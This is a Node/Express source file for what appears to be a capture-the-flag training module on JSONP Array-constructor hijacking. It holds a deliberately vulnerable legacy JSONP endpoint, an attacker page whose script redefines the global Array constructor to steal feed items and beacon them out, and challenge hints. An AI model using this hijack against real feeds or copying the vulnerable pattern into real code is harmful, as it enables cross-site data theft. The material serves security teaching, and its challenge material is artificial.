'use strict';
// Array Constructor Hijack: the legacy endpoint emits new Array(...), so an
// attacker page that overrides the global Array constructor before loading the
// feed captures every element. The feed appends a per-session token; the hijack
// beacon must carry it back, proving the feed was loaded and hijacked in this
// session.
const express = require('express');
const { page, esc, appShell } = require('../../../lib/page');
const { award, captured } = require('../../../lib/flags');
// Provided by the module shared helper (../shared.js) the finisher wires up:
// per-session token appended to the legacy Array feed.
const { jsonpArrayToken } = require('../shared');

const router = express.Router();

// Friend list served by the legacy feed (mirrors the module's feed data).
const FRIENDS = ['alice:A1', 'bob:B2', 'carol:C3'];

// GET /jsonp/legacy -> the legacy JSONP endpoint built with new Array(...).
router.get('/legacy', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 200);
  res.type('application/javascript');
  // VULN: this legacy endpoint builds its JSONP with `new Array(...)`. An
  // attacker page that overrides the global Array constructor before loading
  // this script captures every array element (the classic 2007 hijack).
  // The feed appends a per-session token: the hijack beacon must carry it back,
  // proving the feed was actually loaded and hijacked in this session.
  const items = FRIENDS.concat(['feed-token:' + jsonpArrayToken(req)]);
  res.send(`${cb}(new Array(${items.map((f) => JSON.stringify(f)).join(',')}));`);
});

// GET /jsonp/array-attacker -> the attacker page that hijacks the feed.
router.get('/array-attacker', (req, res) => {
  const done = captured(req, 'jsonp', 'array-hijack');
  res.send(page('Array hijack demo', `
    ${appShell('evil.example', `
      <h2>Attacker page (Array hijack demo)</h2>
      <p>This page plays the role of <code>evil.example</code>. When it loads, it
      redefines the global <code>Array</code> constructor <b>before</b> loading the
      victim's JSONP. Because <code>/jsonp/legacy</code> emits
      <code>new Array(...)</code>, the overridden constructor runs and captures
      every element, then beacons them to <code>/jsonp/array-beacon</code>.</p>
      <div class="clay-card claim-card">
        <div class="card-top"><b>How this captures the flag</b></div>
        <ol>
          <li>This page overrides the global <code>Array</code> constructor
          before the victim feed loads.</li>
          <li>The <code>&lt;script&gt;</code> tag pulls
          <code>/jsonp/legacy?callback=gotFriends</code>; its
          <code>new Array(...)</code> call runs the overridden constructor and
          hands over every element, including the per-session feed token.</li>
          <li>The captured items beacon to <code>/jsonp/array-beacon</code>. A
          valid beacon awards the flag and rotates the token.</li>
        </ol>
      </div>
      <pre><code>${esc('<script src="/jsonp/legacy?callback=gotFriends"></script>')}</code></pre>
      <p id="status">Overriding Array and loading the JSONP feed...</p>
      <script>
        // Capture the real Array BEFORE overriding: a function *declaration*
        // named Array would hoist and shadow it, so capture first, then assign.
        var RealArray = Array;
        var realSlice = RealArray.prototype.slice;
        var stolen = null;
        Array = function () { stolen = realSlice.call(arguments); };
        function gotFriends() {
          document.getElementById('status').textContent =
            'Hijacked ' + (stolen ? stolen.length : 0) + ' elements; beaconing...';
          fetch('/jsonp/array-beacon', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ items: stolen })
          }).then(function (r) { return r.json(); }).then(function (j) {
            document.getElementById('status').innerHTML = j.ok
              ? 'Beacon accepted. Flag: <code>' + j.flag + '</code> (saved to your scoreboard)'
              : 'Beacon rejected: ' + (j.error || 'unknown');
          });
        }
      </script>
      <script src="/jsonp/legacy?callback=gotFriends"></script>
      ${done ? '<p><b>Flag captured.</b> Check your scoreboard.</p>' : ''}
      <p class="note">Array literals (<code>[...]</code>) do not call the
      constructor in modern engines; this works here only because the legacy
      endpoint emits <code>new Array(...)</code>. That is exactly why emitting
      <code>new Array</code> in JSONP was dangerous.</p>
      <p><a class="clay-btn clay-btn-secondary" href="/jsonp#array-hijack">Challenge card</a>
      <a class="clay-btn clay-btn-secondary" href="/jsonp">Module index</a></p>
    `, { mark: '◈', nav: ['Campaigns', 'Targets', 'Exfil'] })}
  `));
});

// POST /jsonp/array-beacon -> accepts the hijacked items, awards the flag.
router.post('/array-beacon', (req, res) => {
  const items = (req.body || {}).items;
  // The beacon must carry the per-session feed token: proof the legacy feed was
  // loaded and its Array hijacked in this session. Single-use: token rotates.
  const tok = req.session.jsonpArrayToken;
  if (Array.isArray(items) && tok && items.includes('alice:A1') && items.includes('feed-token:' + tok)) {
    const flag = award(req, 'jsonp', 'array-hijack');
    delete req.session.jsonpArrayToken;
    return res.json({ ok: true, flag });
  }
  res.status(400).json({ ok: false, error: 'beacon must carry the hijacked items array' });
});

module.exports = {
  vuln: {
    id: 'array-hijack',
    name: 'Array Constructor Hijack',
    difficulty: 'Hard',
    hint: 'The legacy endpoint emits new Array(...). Override the global Array constructor before the JSONP loads.',
    hints: ["The feed is a JavaScript array. What if Array is redefined?", "Redefine Array before loading the feed. The constructor captures the elements.", "Hijack Array, load the feed, beacon the captured items including the token."],
    tools: "B, DT",
    how: 'Visit /jsonp/array-attacker: it redefines Array, loads the feed, and beacons the captured elements.',
    link: '/jsonp#array-hijack',
    start: 'curl -s "http://localhost:3000/jsonp/legacy?callback=gotFriends"',
  },
  router,
};
